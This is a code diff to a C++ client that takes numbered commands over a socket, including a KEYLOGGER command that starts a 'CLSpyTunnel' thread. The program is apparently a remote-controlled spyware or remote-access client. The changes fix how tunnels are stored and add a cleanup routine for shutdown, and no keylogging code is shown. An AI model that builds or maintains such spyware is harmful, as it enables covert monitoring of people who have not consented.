@@ -103,7 +103,7 @@ void Client::start() {
                     printf("[Client] Error sending data: %s\n", strerror(errno));
                     break;
                 }
-                shutdown_flag_ = true;
+                shutdown();
                 break;
             } else if (is_valid_tunnel(command_code) == 0) {
                 CLTunnel* tunnel = get_cltunnel(command_code);
@@ -121,7 +121,7 @@ void Client::start() {
                         continue;
                     }
                     
-                    CLSpyTunnel* clspy_tunnel = tunnel->clspy_tunnel_;
+                    CLSpyTunnel* clspy_tunnel = nullptr;
                     if (command_code == KEYLOGGER) {
                         printf("[Client] Received KEYLOGGER command. Port: %d\n", command_arg+port_);
                         clspy_tunnel = new CLKeylogger();
@@ -132,6 +132,7 @@ void Client::start() {
                             send_out(socket_, EXEC_ERROR);
                             continue;
                         }
+                        tunnel->clspy_tunnel_ = clspy_tunnel;
                     }
 
                     rc = pthread_create(&tunnel->thread, NULL, cltunnel_helper, (void*)tunnel);
@@ -182,8 +183,24 @@ void Client::start() {
     }
 }
 
+void Client::cleanup() {
+    if (socket_ >= 0) {
+        close(socket_);
+        socket_ = -1;
+    }
+
+    for (int i=0; i<TUNNEL_NUMS; i++) {
+        if (cltunnels_[i].thread_running_) {
+            cltunnels_[i].clspy_tunnel_->tunnel_shutdown_flag_ = true;
+            pthread_join(cltunnels_[i].thread, NULL);
+            delete cltunnels_[i].clspy_tunnel_;
+        }
+    }
+}
+
 void Client::shutdown() {
     shutdown_flag_ = true;
     printf("[Client] Shutting down client\n");
-    close(socket_);
+    
+    cleanup();
 }
